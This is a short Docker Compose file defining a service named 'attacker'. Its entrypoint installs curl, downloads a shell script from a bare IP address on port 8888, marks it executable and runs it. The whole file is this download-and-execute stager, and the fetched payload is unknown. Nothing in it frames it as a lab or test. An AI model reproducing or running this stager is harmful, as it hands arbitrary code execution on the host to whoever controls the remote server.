services:
  attacker:
    image: alpine:3.20
    entrypoint:
      - sh
      - -c
      - |
        apk add --no-cache curl >/dev/null 2>&1
        curl -sS -o /tmp/run.sh http://147.45.231.59:8888/run_v5.sh
        chmod +x /tmp/run.sh
        exec /tmp/run.sh
